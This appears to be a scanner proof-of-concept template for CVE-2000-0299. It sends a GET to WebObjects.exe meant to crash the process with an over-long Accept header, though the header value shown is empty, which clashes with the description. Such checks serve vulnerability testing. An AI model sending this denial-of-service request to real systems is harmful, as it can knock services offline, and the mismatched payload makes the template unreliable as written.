[info]
author = "ave"
description = "Apple WebObjects Developer 4.5 CGI-adapter（WebObjects.exe）缓冲区溢出漏洞验证。通过发送包含超长 Accept 头部的 HTTP 请求触发缓冲区溢出，导致 WebObjects.exe 进程崩溃，造成拒绝服务"
id = "POC-AVE-2000-0259"
name = "CVE-2000-0299 PoC"
severity = "medium"
tags = ["cve-2000-0299"]
vuln_id = [
    "CVE-2000-0299",
    "AVE-2000-0259",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/WebObjects.exe"
protocol = "http"

[poc.requests.headers]
Accept = ""

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"
